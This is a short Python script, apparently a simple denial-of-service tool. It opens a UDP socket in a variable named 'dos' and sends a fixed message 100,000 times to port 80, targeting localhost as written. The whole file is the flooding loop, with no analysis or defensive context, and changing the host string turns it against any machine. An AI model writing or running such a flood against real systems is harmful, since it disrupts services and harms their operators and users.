import time, socket, os, sys, string, threading
#print_lock = threading.Lock()

port= 80
host='localhost'
message = "#------------"
ip = socket.gethostbyname(host)
dos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dos.connect((host, port))
for i in range(100000):
    try:
        dos.sendto(message.encode(), (ip, port))
    except (socket.error):
        print("[connection failed]")
dos.close()
